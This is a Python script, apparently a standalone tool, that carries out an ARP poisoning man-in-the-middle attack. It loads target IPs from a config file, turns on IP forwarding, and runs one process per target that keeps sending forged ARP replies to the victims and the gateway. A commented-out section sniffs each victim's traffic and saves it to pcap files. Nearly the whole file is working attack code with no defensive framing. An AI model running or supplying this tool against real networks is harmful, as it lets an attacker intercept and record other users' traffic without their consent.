import os
import sys
import time
import json
import signal
import netifaces
import threading
import multiprocessing
from optparse import OptionParser
from kamene.all import *


CONFIG_FILE = 'config/config.json'
conf.verb = 0  # Verbosity level MUTE


class Spoofing():
    def __init__(self):
        if self.get_config_data():
            data = self.get_config_data()
            self.local_ip = data['config']['local_ip']
            self.iface = data['config']['iface']
            self.gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
            self.list_target_ips = data['config']['list_ip_address']

    def get_config_data(self):
        try:
            with open(CONFIG_FILE, 'r') as json_data:
                return json.load(json_data)
        except:
            return None

    def enable_forwarding(self):
        if self.iface == 'eth0':
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        elif self.iface == 'en0':
            os.system("sysctl -w net.inet.ip.forwarding=1")
        else:
            # TODO: log if no iface is present
            pass

    #Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
    #an ARP reply with MAC Address
    def get_mac(self, ip_address):
        #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
        #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
        resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
        for s,r in resp:
            return r[ARP].hwsrc
        return None

    def restore_network(self, gateway_mac, target_ip, target_mac):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=self.gateway_ip), count=5)
        print("[*] Disabling IP forwarding")
        if self.iface == 'en0':
            os.system("sysctl -w net.inet.ip.forwarding=0")
        if self.iface == 'eth0':
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        #kill process on a mac
        os.kill(os.getpid(), signal.SIGTERM)

    #Keep sending false ARP replies to put our machine in the middle to intercept packets
    #This will use our interface MAC address as the hwsrc for the ARP reply
    def arp_poison(self, gateway_mac, target_ip, target_mac):
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        try:
            print("La ip target: ", target_ip)
            while True:
                send(ARP(op=2, pdst=self.gateway_ip, psrc=target_ip))
                send(ARP(op=2, pdst=target_ip, psrc=self.gateway_ip))
                time.sleep(2)
                print("La ip dentro: ", target_ip)
        except KeyboardInterrupt:
            print("[*] Stopped ARP poison attack. Restoring network")
            self.restore_network(gateway_mac, target_ip, target_mac)

    def main(self):
        # Load variables from config
        print('[*] Enabling IP forwarding')
        self.enable_forwarding()
        
        print(f'[*] Gateway IP address: {self.gateway_ip}')
        gateway_mac = self.get_mac(self.gateway_ip)
        if gateway_mac is None:
            print('[!] Unable to get gateway MAC address. Exiting..')
            sys.exit(0)
        else:
            print(f'[*] Gateway MAC address: {gateway_mac}')

        list_processes = []
        for target_ip in self.list_target_ips:
            target_mac = self.get_mac(target_ip)
            if target_mac is None:
                print('[!] Unable to get target MAC address. Exiting..')
                sys.exit(0)
            else:
                print(f'[*] Target MAC address: {target_mac}')

            #ARP poison process
            arp_process = multiprocessing.Process(
                target=self.arp_poison, 
                args=(gateway_mac, target_ip, target_mac)
            )
            arp_process.start()
            list_processes.append(arp_process)

            #Sniff traffic and write to file. Capture is filtered on target machine
            # try:
            #     sniff_filter = 'ip host ' + target_ip
            #     print(f'[*] Starting network capture. Packet Count: {100}. Filter: {sniff_filter}')
            #     packets = sniff(filter=sniff_filter, iface=self.iface)
            #     wrpcap(target_ip + '_capture.pcap', packets)
            #     print(f'[*] Stopping network capture..Restoring network')
            #     self.restore_network(gateway_mac, target_ip, target_mac)
            # except KeyboardInterrupt:
            #     print(f'[*] Stopping network capture..Restoring network')
            #     self.restore_network(gateway_mac, target_ip, target_mac)
            #     sys.exit(0)
        for process in list_processes:
            process.join()


if __name__ == '__main__':
    
    spoofing = Spoofing()
    spoofing.main()
